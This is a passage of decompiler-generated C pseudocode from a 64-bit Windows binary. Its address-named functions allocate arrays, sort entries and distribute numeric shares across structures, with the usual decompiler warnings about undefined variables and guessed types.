              sub_13F147918(a1, v15, v17, v14 + *(_QWORD *)(a1 + 96), v18, a3);
            result = sub_13F152CDC(a2, v15, v16);
            --v10;
          }
        }
        v16 = (unsigned int)(v16 + 1);
      }
      while ( v10 );
      v12 = v19;
    }
    ++v13;
  }
  return result;
}
// 13F14570E: conditional instruction was optimized away because ebx.4!=0

//----- (000000013F1457BC) ----------------------------------------------------
void __fastcall sub_13F1457BC(__int64 a1)
{
  __int64 i; // rbx
  __int64 v3; // rsi
  _DWORD *v4; // rcx
  unsigned int v5; // edx

  for ( i = 0i64; (unsigned int)i < *(_DWORD *)(a1 + 12); i = (unsigned int)(i + 1) )
  {
    v3 = *(_QWORD *)(*(_QWORD *)(a1 + 120) + 8 * i);
    if ( *(_BYTE *)(v3 + 33) == 1 )
    {
      v4 = *(_DWORD **)(v3 + 16);
      v5 = v4[59];
      if ( v5 >= v4[44] + v4[58] )
        v5 = v4[44] + v4[58];
      *(_DWORD *)(v3 + 36) = sub_13F151F48(v4, v5);
    }
  }
}

//----- (000000013F145820) ----------------------------------------------------
char __fastcall sub_13F145820(
        __int64 a1,
        __int64 a2,
        unsigned __int16 a3,
        unsigned __int16 a4,
        unsigned __int64 a5,
        int a6,
        char a7)
{
  _QWORD *v11; // rax
  unsigned int v12; // er15
  int v13; // er13
  unsigned __int64 v14; // rsi
  unsigned __int64 v15; // rcx
  unsigned __int16 i; // dx
  int v17; // eax
  unsigned __int64 v18; // rdi
  unsigned __int128 v19; // rax
  bool v20; // cf
  unsigned __int64 *v21; // rax
  __int64 v22; // rcx
  __int64 v23; // rax
  _QWORD *v24; // rax
  int v25; // er14
  __int64 v26; // rax
  int v27; // ebp
  __int64 v28; // rdi
  __int64 v29; // rax

  v11 = (_QWORD *)sub_13F14059C(16i64);
  v12 = 0;
  if ( v11 )
  {
    v11[1] = a1;
    *v11 = off_13F18A1A0;
  }
  else
  {
    v11 = 0i64;
  }
  v13 = a3;
  v14 = a5;
  *(_QWORD *)(a1 + 56) = v11;
  *(_QWORD *)(a1 + 32) = a2;
  *(_DWORD *)(a1 + 16) = a4;
  *(_QWORD *)a1 = a5;
  *(_DWORD *)(a1 + 20) = v13;
  if ( a6 )
  {
    v17 = a6;
  }
  else
  {
    v15 = a5;
    for ( i = 0; v15; v15 &= v15 - 1 )
      ++i;
    v17 = i;
  }
  *(_DWORD *)(a1 + 8) = v17;
  v18 = *(unsigned int *)(a1 + 8);
  v19 = *(unsigned int *)(a1 + 8) * (unsigned __int128)0x30ui64;
  *(_DWORD *)(a1 + 12) = 0;
  if ( !is_mul_ok(v18, 0x30ui64) )
    *(_QWORD *)&v19 = -1i64;
  v20 = __CFADD__((_QWORD)v19, 8i64);
  *(_QWORD *)&v19 = v19 + 8;
  if ( v20 )
    *(_QWORD *)&v19 = -1i64;
  v21 = (unsigned __int64 *)sub_13F1790C4(v19, *((_QWORD *)&v19 + 1));
  if ( v21 )
  {
    *v21 = v18;
    v22 = (__int64)(v21 + 1);
  }
  else
  {
    v22 = 0i64;
  }
  v23 = *(unsigned int *)(a1 + 8);
  *(_QWORD *)(a1 + 48) = v22;
  LOBYTE(v24) = sub_13F15EF70(v22, 0, 48 * v23);
  v25 = 0;
  if ( *(_DWORD *)(a1 + 8) )
  {
    while ( !a6 )
    {
      if ( (v14 & 1) != 0 )
      {
        v26 = v12++;
        v27 = v25 + (*(_DWORD *)(a1 + 16) << 8);
        v28 = *(_QWORD *)(a1 + 48) + 48 * v26;
        v24 = (_QWORD *)sub_13F14059C(16i64);
        if ( v24 )
        {
          v24[1] = v28;
          *v24 = off_13F18A188;
        }
        *(_QWORD *)(v28 + 40) = v24;
        *(_BYTE *)(v28 + 8) = v25;
LABEL_25:
        *(_DWORD *)(v28 + 4) = v27;
        *(_QWORD *)(v28 + 16) = a1;
      }
      v14 >>= 1;
      ++v25;
      if ( v12 >= *(_DWORD *)(a1 + 8) )
        return (char)v24;
    }
    v29 = v12++;
    v28 = *(_QWORD *)(a1 + 48) + 48 * v29;
    v27 = v25 + (v13 << 8) + (*(_DWORD *)(a1 + 16) << 16);
    v24 = (_QWORD *)sub_13F14059C(16i64);
    if ( v24 )
    {
      v24[1] = v28;
      *v24 = off_13F18A188;
    }
    *(_QWORD *)(v28 + 40) = v24;
    LOBYTE(v24) = v25 + a7;
    *(_BYTE *)(v28 + 8) = v25 + a7;
    goto LABEL_25;
  }
  return (char)v24;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18A188: using guessed type __int64 (__fastcall *off_13F18A188[3])();
// 13F18A1A0: using guessed type __int64 (__fastcall *off_13F18A1A0[6])();

//----- (000000013F145A08) ----------------------------------------------------
__int64 __fastcall sub_13F145A08(__int64 a1, __int64 a2)
{
  unsigned int v2; // eax
  __int64 v4; // rdx
  __int64 v5; // rdx
  unsigned __int128 v6; // rax
  __int64 v7; // rax
  bool v8; // zf
  unsigned __int128 v9; // rax
  __int64 v10; // rax
  unsigned __int64 v11; // rcx
  unsigned __int128 v12; // rax
  __int64 result; // rax
  __int64 v14; // rcx

  v2 = *(_DWORD *)(a1 + 16);
  if ( v2 < *(_DWORD *)(a1 + 12) )
  {
    do
      v2 *= 2;
    while ( v2 < *(_DWORD *)(a1 + 12) );
    *(_DWORD *)(a1 + 16) = v2;
    sub_13F14088C(*(_QWORD *)(a1 + 120), a2);
    sub_13F14088C(*(_QWORD *)(a1 + 128), v4);
    sub_13F14088C(*(_QWORD *)(a1 + 136), v5);
    v6 = *(unsigned int *)(a1 + 16) * (unsigned __int128)8ui64;
    if ( !is_mul_ok(*(unsigned int *)(a1 + 16), 8ui64) )
      *(_QWORD *)&v6 = -1i64;
    v7 = sub_13F1790C4(v6, *((_QWORD *)&v6 + 1));
    v8 = *(_QWORD *)(a1 + 128) == 0i64;
    *(_QWORD *)(a1 + 120) = v7;
    if ( !v8 )
    {
      v9 = *(unsigned int *)(a1 + 16) * (unsigned __int128)8u;
      if ( !is_mul_ok(*(unsigned int *)(a1 + 16), 8ui64) )
        *(_QWORD *)&v9 = -1i64;
      v10 = sub_13F1790C4(v9, *((_QWORD *)&v9 + 1));
      v11 = *(unsigned int *)(a1 + 16);
      *(_QWORD *)(a1 + 128) = v10;
      v12 = v11 * (unsigned __int128)8u;
      if ( !is_mul_ok(v11, 8ui64) )
        *(_QWORD *)&v12 = -1i64;
      *(_QWORD *)(a1 + 136) = sub_13F1790C4(v12, *((_QWORD *)&v12 + 1));
    }
  }
  result = sub_13F15EF70(*(_QWORD *)(a1 + 120), 0, 8i64 * *(unsigned int *)(a1 + 12));
  v14 = *(_QWORD *)(a1 + 128);
  if ( v14 )
  {
    sub_13F15EF70(v14, 0, 8i64 * *(unsigned int *)(a1 + 12));
    return sub_13F15EF70(*(_QWORD *)(a1 + 136), 0, 8i64 * *(unsigned int *)(a1 + 12));
  }
  return result;
}
// 13F145A40: variable 'v4' is possibly undefined
// 13F145A4C: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F145B08) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F145B08()
{
  __int64 result; // rax

  sub_13F1471D4();
  sub_13F143420();
  byte_13F1C5D84 = 0;
  dword_13F1C5D88 = 1;
  result = 0i64;
  dword_13F1C5D80 = 0;
  dword_13F1C5D8C = 1;
  qword_13F1C5D78 = 0i64;
  return result;
}
// 13F145C18: write access to const memory at 13F1C5D80 has been detected
// 13F145C21: write access to const memory at 13F1C5D8C has been detected
// 13F145C27: write access to const memory at 13F1C5D84 has been detected
// 13F145CC8: write access to const memory at 13F1C5D80 has been detected
// 13F145CD1: write access to const memory at 13F1C5D8C has been detected
// 13F145CD7: write access to const memory at 13F1C5D84 has been detected
// 13F145CE4: write access to const memory at 13F1C5D88 has been detected
// 13F145CFA: write access to const memory at 13F1C5D84 has been detected
// 13F145D06: write access to const memory at 13F1C5D88 has been detected
// 13F145D79: write access to const memory at 13F1C5D80 has been detected
// 13F145D7F: write access to const memory at 13F1C5D8C has been detected
// 13F145DB1: write access to const memory at 13F1C5D78 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1C5D60: using guessed type __int64 qword_13F1C5D60;
// 13F1C5D78: using guessed type __int64 qword_13F1C5D78;
// 13F1C5D80: using guessed type int dword_13F1C5D80;
// 13F1C5D84: using guessed type char byte_13F1C5D84;
// 13F1C5D88: using guessed type int dword_13F1C5D88;
// 13F1C5D8C: using guessed type int dword_13F1C5D8C;
// 13F1C5D90: using guessed type int dword_13F1C5D90;
// 13F1C5D94: using guessed type int dword_13F1C5D94;
// 13F1C5D98: using guessed type __int64 qword_13F1C5D98;

//----- (000000013F145DC8) ----------------------------------------------------
__int64 __fastcall sub_13F145DC8(__int64 a1, __int64 a2, char a3, char a4)
{
  __int64 v7; // rax
  unsigned int v8; // esi
  __int64 v9; // r8
  unsigned int v10; // ecx
  unsigned int v11; // edx
  unsigned int v12; // edi
  int v13; // eax
  unsigned int v14; // er15
  int v15; // er15
  int v16; // eax
  unsigned int v17; // er9
  unsigned int v18; // er14
  int v19; // er15
  char v20; // r13
  unsigned int v21; // eax
  __int64 v22; // rdi
  int v24; // [rsp+80h] [rbp+18h]
  char v25; // [rsp+88h] [rbp+20h]

  v25 = a4;
  if ( a3 )
  {
    v7 = sub_13F1436F0(a1);
    a4 = v25;
    *(_QWORD *)(a2 + 32) = v7;
  }
  v8 = 0;
  v9 = *(unsigned int *)(a2 + 232);
  v10 = *(_DWORD *)(a2 + 220) - v9;
  v11 = *(_DWORD *)(a2 + 180);
  v12 = *(_DWORD *)(a2 + 236);
  v24 = *(_DWORD *)(a2 + 208);
  if ( !a4 )
  {
    v19 = *(_DWORD *)(a2 + 220) - v9;
    if ( v10 <= v11 )
      v19 = *(_DWORD *)(a2 + 180);
    v14 = v9 + v19;
    if ( v12 >= (int)v9 + *(_DWORD *)(a2 + 176) )
      v12 = v9 + *(_DWORD *)(a2 + 176);
    goto LABEL_25;
  }
  v13 = *(_DWORD *)(a2 + 220) - v9;
  if ( v10 <= v11 )
    v13 = *(_DWORD *)(a2 + 180);
  if ( v12 >= (int)v9 + v13 + 1 )
  {
    v15 = *(_DWORD *)(a2 + 220) - v9;
    if ( v10 <= v11 )
      v15 = *(_DWORD *)(a2 + 180);
    v14 = v9 + v15 + 1;
  }
  else
  {
    v14 = *(_DWORD *)(a2 + 236);
  }
  v16 = *(_DWORD *)(a2 + 236);
  v17 = v9 + *(_DWORD *)(a2 + 176);
  if ( v12 >= v17 )
    v16 = v9 + *(_DWORD *)(a2 + 176);
  if ( v12 >= v16 + 1 )
  {
    if ( v12 >= v17 )
      v12 = v9 + *(_DWORD *)(a2 + 176);
    ++v12;
  }
  a4 = v25;
  if ( a3 )
  {
LABEL_25:
    v18 = v14;
    goto LABEL_26;
  }
  if ( v10 <= v11 )
    v10 = *(_DWORD *)(a2 + 180);
  v12 = (unsigned int)v9 + v10 < *(_DWORD *)(a1 + 32);
  v18 = *(_DWORD *)(a2 + 208) < v14;
LABEL_26:
  v20 = 0;
  if ( v12 )
  {
    sub_13F147668(a1, a2, a4);
    sub_13F1462F8(a1);
    v21 = sub_13F146F84(a1, a2, v12, 0);
    v8 = v21;
    if ( v21 < v12 && (a3 || v18) )
    {
      v20 = 1;
      v8 = sub_13F146B08(a1, a2, v12 - v21, -2) + v21;
      if ( v8 < v12 )
      {
        v8 += sub_13F1465C8(a1, a2, v8 + v24, v14, v12 + v24);
        if ( v8 < v18 )
        {
          v8 += sub_13F146B08(a1, a2, v18 - v8, -1);
          if ( v8 < v18 )
            v8 += sub_13F146F20(a1, a2, v18 - v8);
        }
      }
    }
    sub_13F147180(a1);
  }
  LOBYTE(v9) = a3;
  v22 = sub_13F152718(a2, v8, v9, v25);
  if ( v20 )
    sub_13F1435CC(a1, a2);
  return v22;
}
// 13F145F93: variable 'v9' is possibly undefined

//----- (000000013F145FC4) ----------------------------------------------------
void **__fastcall sub_13F145FC4(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  void **result; // rax
  __int64 v7; // r12
  unsigned int i; // edi
  unsigned __int64 v9; // r14
  __int64 v10; // rbx
  __int64 j; // rsi
  void **v12; // r8
  bool v13; // zf
  void *retaddr; // [rsp+48h] [rbp+0h] BYREF

  result = &retaddr;
  *(_QWORD *)(a4 + 8) = 0i64;
  *(_DWORD *)a4 = a2;
  *(_QWORD *)(a4 + 16) = a3;
  v7 = *(_QWORD *)(a3 + 32);
  if ( v7 )
  {
    for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
    {
      v9 = (unsigned __int64)i << 6;
      v10 = v9 + v7;
      *(_DWORD *)(v10 + 48) = 0;
      *(_DWORD *)(v10 + 52) = 0;
      if ( *(_DWORD *)(v9 + v7 + 36) )
      {
        for ( j = 0i64; (unsigned int)j < *(_DWORD *)(v10 + 8); j = (unsigned int)(j + 1) )
        {
          result = *(void ***)(v10 + 56);
          v12 = &result[9 * j];
          v13 = *(_DWORD *)v12 == 4;
          *((_BYTE *)v12 + 64) = 0;
          if ( v13 )
          {
            result = (void **)*((unsigned int *)v12 + 10);
            if ( !(_DWORD)result )
              result = (void **)sub_13F147918(
                                  a1,
                                  v9 + v7,
                                  (__int64)v12,
                                  v9 + *(_QWORD *)(a1 + 96),
                                  (_DWORD *)(*(_QWORD *)(v9 + *(_QWORD *)(a1 + 96) + 48) + 48 * j),
                                  a4);
          }
        }
      }
    }
  }
  return result;
}

//----- (000000013F146098) ----------------------------------------------------
__int64 __fastcall sub_13F146098(__int64 a1, __int64 a2)
{
  __int64 v3; // rsi
  __int64 result; // rax
  __int64 v5; // rbx
  bool i; // zf
  unsigned int v7; // er14
  unsigned int v8; // eax
  __int64 v9; // rcx
  unsigned int v10; // eax
  unsigned int v11; // edx
  char v12; // al
  unsigned int v13; // eax
  unsigned int v14; // [rsp+60h] [rbp+8h] BYREF
  int v15; // [rsp+68h] [rbp+10h] BYREF
  unsigned int v16; // [rsp+70h] [rbp+18h] BYREF

  v3 = 0i64;
  result = sub_13F145A08(a1, a2);
  v5 = *(_QWORD *)(a1 + 152);
  for ( i = v5 == 0; ; i = v5 == *(_QWORD *)(a1 + 152) )
  {
    v5 = i ? 0i64 : *(_QWORD *)(v5 + 48);
    if ( !v5 )
      break;
    sub_13F15EF70(v5 + 112, 0, 0x38ui64);
    sub_13F145FC4(a1, v3, v5, v5 + 112);
    v7 = *(_DWORD *)(v5 + 208);
    if ( *(_BYTE *)(v5 + 264) )
    {
      v8 = *(_DWORD *)(v5 + 168);
      v9 = *(_QWORD *)(v5 + 16);
      v16 = 0;
      v15 = 0;
      v14 = v8;
      (*(void (__fastcall **)(__int64, unsigned int *, int *, unsigned int *))(*(_QWORD *)v9 + 8i64))(
        v9,
        &v16,
        &v15,
        &v14);
      v10 = sub_13F1516B0(*(_QWORD *)(v5 + 104), v7, v16, v15, v14);
      *(_DWORD *)(v5 + 148) = v10;
      if ( v10 > *(_DWORD *)(v5 + 208) )
        *(_DWORD *)(v5 + 148) = sub_13F151F48((_DWORD *)v5, v10);
      *(_DWORD *)(v5 + 168) = v14;
    }
    else
    {
      *(_DWORD *)(v5 + 148) = v7;
    }
    v11 = *(_DWORD *)(v5 + 208);
    if ( v11 )
    {
      if ( *(_DWORD *)(v5 + 136) )
        goto LABEL_9;
    }
    else if ( !*(_DWORD *)(v5 + 248) )
    {
      goto LABEL_9;
    }
    if ( v11 > *(_DWORD *)(v5 + 148) )
      goto LABEL_9;
    v13 = *(_DWORD *)(v5 + 236);
    if ( v13 >= *(_DWORD *)(v5 + 176) + *(_DWORD *)(v5 + 232) )
      v13 = *(_DWORD *)(v5 + 176) + *(_DWORD *)(v5 + 232);
    if ( v11 >= v13 )
    {
LABEL_9:
      v12 = 0;
      goto LABEL_10;
    }
    v12 = 1;
LABEL_10:
    *(_BYTE *)(v5 + 145) = v12;
    result = *(_QWORD *)(a1 + 120);
    *(_QWORD *)(result + 8 * v3) = v5 + 112;
    v3 = (unsigned int)(v3 + 1);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1461EC) ----------------------------------------------------
void __fastcall sub_13F1461EC(__int64 a1)
{
  __int64 i; // rbp
  __int64 v3; // rax
  __int64 v4; // rdi
  __int64 v5; // rbx
  unsigned int v6; // edx
  int v7; // er9
  unsigned int v8; // er8
  unsigned int v9; // ecx
  unsigned int v10; // eax
  int v11; // ecx
  unsigned int v12; // er8
  int v13; // ecx
  unsigned int v14; // edx
  unsigned int v15; // eax

  for ( i = 0i64; (unsigned int)i < *(_DWORD *)(a1 + 12); i = (unsigned int)(i + 1) )
  {
    v3 = *(_QWORD *)(a1 + 120);
    v4 = *(_QWORD *)(v3 + 8 * i);
    v5 = *(_QWORD *)(v4 + 16);
    if ( *(_DWORD *)(v5 + 216) )
      sub_13F14551C(a1, *(_QWORD *)(v4 + 16), *(_QWORD *)(v3 + 8 * i));
    if ( *(_DWORD *)(v4 + 24) )
    {
      v6 = *(_DWORD *)(v5 + 208) - *(_DWORD *)(v4 + 24);
      if ( *(_DWORD *)(v4 + 36) > v6 )
      {
        v7 = *(_DWORD *)(v5 + 232);
        v8 = *(_DWORD *)(v5 + 180);
        v9 = *(_DWORD *)(v5 + 220) - v7;
        v10 = v9;
        if ( v9 <= v8 )
          v10 = *(_DWORD *)(v5 + 180);
        if ( v7 + v10 <= v6 )
        {
          v11 = *(_DWORD *)(v5 + 208) - *(_DWORD *)(v4 + 24);
        }
        else
        {
          if ( v9 <= v8 )
            v9 = *(_DWORD *)(v5 + 180);
          v11 = v7 + v9;
        }
        *(_DWORD *)(v4 + 36) = v11;
      }
    }
    v12 = *(_DWORD *)(v5 + 208);
    if ( *(_DWORD *)(v4 + 36) < v12 )
    {
      v13 = *(_DWORD *)(v5 + 232);
      v14 = *(_DWORD *)(v5 + 220) - v13;
      if ( v14 <= *(_DWORD *)(v5 + 180) )
        v14 = *(_DWORD *)(v5 + 180);
      if ( v12 - *(_DWORD *)(v5 + 216) > v13 + v14 )
        sub_13F145668(a1, v5, v4);
    }
    if ( !*(_BYTE *)(v5 + 264) )
    {
      v15 = *(_DWORD *)(v5 + 208);
      if ( *(_DWORD *)(v4 + 36) > v15 )
        *(_DWORD *)(v4 + 36) = v15;
    }
  }
}

//----- (000000013F1462F8) ----------------------------------------------------
__int64 __fastcall sub_13F1462F8(__int64 a1)
{
  __int64 i; // rbx
  __int64 result; // rax
  __int64 v4; // r8
  __int64 v5; // rdx

  for ( i = 0i64; (unsigned int)i < *(_DWORD *)(a1 + 12); i = (unsigned int)(i + 1) )
  {
    result = *(_QWORD *)(a1 + 120);
    v4 = *(_QWORD *)(result + 8 * i);
    v5 = *(_QWORD *)(v4 + 16);
    if ( *(_DWORD *)(v5 + 216) )
      result = sub_13F14551C(a1, v5, v4);
  }
  return result;
}

//----- (000000013F14633C) ----------------------------------------------------
__int64 __fastcall sub_13F14633C(__int64 a1, int a2)
{
  __int64 v2; // r9
  unsigned int v4; // er8
  __int64 v5; // rdx
  __int64 v6; // rbx
  __int64 v7; // rdx
  unsigned int i; // edx
  __int64 v9; // rax
  unsigned int v10; // er8
  __int64 j; // rbx
  unsigned __int64 v12; // rax
  unsigned int v13; // ecx
  __int64 v14; // rcx
  __int64 v15; // r8
  __int64 v16; // rbx
  int v17; // er11
  __int64 v18; // rbx
  __int64 v19; // rsi
  __int64 v20; // r15
  __int64 v21; // rdi
  unsigned int v22; // ebp
  __int64 *v23; // r14
  __int64 v24; // rdx
  unsigned int v25; // er8
  __int64 v26; // rdx
  __int64 v27; // r8
  unsigned int v28; // edx
  __int64 v29; // rcx
  __int64 v30; // rax
  __int64 v31; // r12
  __int64 v32; // r8
  __int64 v33; // rbp
  unsigned int v34; // er14
  unsigned int v35; // er11
  __int64 v36; // rcx
  unsigned int *v37; // rdi
  unsigned __int64 v38; // rax
  unsigned int v39; // ebx
  unsigned int v40; // eax
  unsigned int v42; // [rsp+40h] [rbp+10h]
  unsigned int v43; // [rsp+48h] [rbp+18h]

  LODWORD(v2) = a2;
  v4 = 0;
  if ( a2 )
  {
    do
    {
      do
      {
        v5 = *(_QWORD *)(a1 + 136);
        v6 = *(_QWORD *)(v5 + 8i64 * v4);
        if ( *(_DWORD *)(v6 + 4) )
          break;
        v2 = (unsigned int)(v2 - 1);
        *(_QWORD *)(v5 + 8i64 * v4) = *(_QWORD *)(v5 + 8 * v2);
        *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v2) = v6;
      }
      while ( v4 < (unsigned int)v2 );
      v7 = v4++;
      *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v7) + 40i64) = 0;
      *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v7) + 44i64) = 0;
      *(_BYTE *)(*(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v7) + 32i64) = 1;
    }
    while ( v4 < (unsigned int)v2 );
  }
  v42 = v2;
  for ( i = 0; i < (unsigned int)v2; ++i )
  {
    do
    {
      v9 = *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8i64 * i);
      if ( *(_DWORD *)(v9 + 40) )
        break;
      v10 = 0;
      for ( j = *(_QWORD *)(*(_QWORD *)(v9 + 16) + 32i64); v10 < *(_DWORD *)(a1 + 28); ++v10 )
      {
        v12 = (unsigned __int64)v10 << 6;
        v13 = *(_DWORD *)(v12 + j + 36);
        if ( v13 && v13 < *(_DWORD *)(v12 + j + 8) )
        {
          v14 = *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8i64 * i);
          ++*(_DWORD *)(v14 + 40);
        }
      }
      v15 = *(_QWORD *)(a1 + 136);
      v16 = *(_QWORD *)(v15 + 8i64 * i);
      if ( !*(_DWORD *)(v16 + 40) )
      {
        v2 = (unsigned int)(v2 - 1);
        *(_QWORD *)(v15 + 8i64 * i) = *(_QWORD *)(v15 + 8 * v2);
        *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v2) = v16;
      }
    }
    while ( i < (unsigned int)v2 );
  }
  v17 = 0;
  if ( (_DWORD)v2 )
  {
    v18 = *(_QWORD *)(a1 + 136);
    v19 = 0i64;
    do
    {
      v20 = (unsigned int)(v17 + 1);
      LODWORD(v21) = v17;
      v22 = v20;
      if ( (unsigned int)v20 < (unsigned int)v2 )
      {
        v23 = (__int64 *)(v18 + 8 * v20);
        do
        {
          v24 = *v23;
          v25 = v22;
          ++v23;
          if ( *(_DWORD *)(v24 + 40) >= *(_DWORD *)(*(_QWORD *)(v18 + 8i64 * (unsigned int)v21) + 40i64) )
            v25 = v21;
          ++v22;
          v21 = v25;
        }
        while ( v22 < (unsigned int)v2 );
        if ( v17 != v25 )
        {
          v26 = *(_QWORD *)(a1 + 136);
          v27 = *(_QWORD *)(v19 + v26);
          *(_QWORD *)(v19 + v26) = *(_QWORD *)(v26 + 8 * v21);
          *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v21) = v27;
        }
      }
      v18 = *(_QWORD *)(a1 + 136);
      v28 = 0;
      v29 = *(_QWORD *)(v19 + v18);
      v30 = *(_QWORD *)(v29 + 16);
      v31 = *(_QWORD *)(v30 + 32);
      v32 = *(_QWORD *)(v30 + 40);
      if ( *(_DWORD *)(v29 + 40) )
      {
        do
        {
          v33 = v28 + 1;
          v34 = v28;
          v35 = v33;
          v43 = *(_DWORD *)(v32 + 4i64 * v28);
          v36 = v31 + ((unsigned __int64)v43 << 6);
          if ( (unsigned int)v33 < *(_DWORD *)(a1 + 28) )
          {
            v37 = (unsigned int *)(v32 + 4 * v33);
            do
            {
              v38 = (unsigned __int64)*v37 << 6;
              v39 = *(_DWORD *)(v38 + v31 + 36);
              if ( v39 )
              {
                if ( v39 < *(_DWORD *)(v38 + v31 + 8) )
                {
                  v40 = *(_DWORD *)(v36 + 36);
                  if ( !v40 || v40 >= *(_DWORD *)(v36 + 8) || v39 > v40 )
                  {
                    v34 = v35;
                    v36 = v31 + ((unsigned __int64)*(unsigned int *)(v32 + 4i64 * v35) << 6);
                  }
                }
              }
              ++v35;
              ++v37;
            }
            while ( v35 < *(_DWORD *)(a1 + 28) );
            if ( v28 != v34 )
            {
              *(_DWORD *)(v32 + 4i64 * v28) = *(_DWORD *)(v32 + 4i64 * v34);
              *(_DWORD *)(v32 + 4i64 * v34) = v43;
            }
          }
          v18 = *(_QWORD *)(a1 + 136);
          ++v28;
        }
        while ( (unsigned int)v33 < *(_DWORD *)(*(_QWORD *)(v19 + v18) + 40i64) );
      }
      v19 += 8i64;
      v17 = v20;
    }
    while ( (unsigned int)v20 < (unsigned int)v2 );
  }
  return v42;
}
// 13F146366: conditional instruction was optimized away because edx.4!=0

//----- (000000013F1465C8) ----------------------------------------------------
__int64 __fastcall sub_13F1465C8(__int64 a1, __int64 a2, unsigned int a3, unsigned int a4, int a5)
{
  unsigned int v5; // esi
  unsigned int v8; // eax
  int v9; // er15
  unsigned int v10; // edi
  __int64 v11; // r11
  __int64 v12; // r8
  _DWORD *v13; // rcx
  int v14; // er14
  unsigned int v15; // er10
  unsigned int v16; // edx
  unsigned int v17; // eax
  unsigned int v18; // ebx
  unsigned __int128 v19; // rax
  __int64 *v20; // rbx
  unsigned int v21; // er10
  unsigned int v22; // er8
  __int64 v23; // rcx
  double i; // xmm6_8
  __int64 v25; // r9
  int v26; // ecx
  unsigned int v27; // edx
  __int64 v28; // rax
  double v29; // xmm7_8
  __int64 *v30; // rcx
  __int64 v31; // rdx
  __int64 v32; // rax
  char v33; // r8
  __int64 *v34; // rcx
  __int64 v35; // r10
  __int64 v36; // r9
  int v37; // edx
  double v38; // xmm1_8
  double v39; // xmm2_8
  __int64 *v40; // rdx
  __int64 v41; // r10
  __int64 v42; // r11
  _DWORD *v43; // rax
  unsigned int v44; // ecx
  int v45; // er9
  unsigned int v46; // eax
  double v47; // xmm1_8
  double v48; // xmm2_8
  __int64 *v49; // rdx
  __int64 v50; // r9
  __int64 v51; // r10
  _DWORD *v52; // rax
  int v53; // er14
  unsigned int v54; // ecx
  unsigned int v55; // er11
  unsigned int v56; // eax
  double v57; // xmm1_8
  double v58; // xmm0_8
  __int64 *v59; // rsi
  __int64 v60; // rdi
  __int64 v61; // r8
  int v62; // er9

  v5 = 0;
  v8 = *(_DWORD *)(a1 + 12);
  if ( v8 > 1 )
  {
    v9 = a3;
    v10 = 1;
    v11 = v8 - 1;
    v12 = *(_QWORD *)(a1 + 120) + 8i64;
    do
    {
      v13 = *(_DWORD **)(*(_QWORD *)v12 + 16i64);
      v14 = v13[58];
      v15 = v13[45];
      v16 = v13[55] - v14;
      v17 = v16;
      if ( v16 <= v15 )
        v17 = v13[45];
      v18 = v13[52] - v13[54];
      if ( v18 > v14 + v17 )
      {
        ++v10;
        if ( v16 <= v15 )
          v16 = v13[45];
        a4 += v14 + v16;
        v9 += v18;
      }
      v12 += 8i64;
      --v11;
    }
    while ( v11 );
    if ( v10 > 1 && a4 <= v9 )
    {
      v19 = v10 * (unsigned __int128)8u;
      if ( !is_mul_ok(v10, 8ui64) )
        *(_QWORD *)&v19 = -1i64;
      v20 = (__int64 *)sub_13F1790C4(v19, *((_QWORD *)&v19 + 1));
      v21 = 1;
      v22 = 1;
      v23 = **(_QWORD **)(a1 + 120);
      *v20 = v23;
      *(double *)(v23 + 32) = (double)a5;
      for ( i = *(double *)(*v20 + 32) + 0.0; v22 < *(_DWORD *)(a1 + 12); ++v22 )
      {
        v25 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 120) + 8i64 * v22) + 16i64);
        v26 = *(_DWORD *)(v25 + 232);
        v27 = *(_DWORD *)(v25 + 220) - v26;
        if ( v27 <= *(_DWORD *)(v25 + 180) )
          v27 = *(_DWORD *)(v25 + 180);
        if ( *(_DWORD *)(v25 + 208) - *(_DWORD *)(v25 + 216) > v26 + v27 )
        {
          v28 = v21++;
          v20[v28] = v25 + 112;
          i = i + *(double *)(v25 + 144);
        }
      }
      while ( 1 )
      {
        v29 = (double)v9 / i;
        v30 = v20;
        v31 = v10;
        do
        {
          v32 = *v30++;
          *(double *)(v32 + 8) = v29 * *(double *)(v32 + 32);
          --v31;
        }
        while ( v31 );
        sub_13F1472EC(v20, v10);
        v33 = 0;
        v34 = v20 + 1;
        v35 = v10 - 1;
        do
        {
          v36 = *v34;
          v37 = *(_DWORD *)(*(_QWORD *)(*v34 + 16) + 208i64) - *(_DWORD *)(*(_QWORD *)(*v34 + 16) + 216i64);
          if ( *(_DWORD *)(*v34 + 4) > (unsigned int)v37 )
          {
            v38 = *(double *)(v36 + 32);
            v33 = 1;
            v39 = (double)v37 / (double)*(int *)(v36 + 4);
            i = i - (1.0 - v39) * v38;
            *(double *)(v36 + 32) = v38 * v39;
          }
          ++v34;
          --v35;
        }
        while ( v35 );
        if ( !v33 )
        {
          v40 = v20;
          v41 = v10;
          do
          {
            v42 = *v40;
            v43 = *(_DWORD **)(*v40 + 16);
            v44 = v43[44] + v43[58];
            v46 = v43[59];
            v45 = v46;
            if ( v46 >= v44 )
              v46 = v44;
            if ( *(_DWORD *)(v42 + 4) > v46 )
            {
              v47 = *(double *)(v42 + 32);
              v33 = 1;
              if ( v45 >= v44 )
                v45 = v44;
              v48 = (double)v45 / (double)*(int *)(v42 + 4);
              i = i - (1.0 - v48) * v47;
              *(double *)(v42 + 32) = v47 * v48;
            }
            ++v40;
            --v41;
          }
          while ( v41 );
          if ( !v33 )
          {
            v49 = v20;
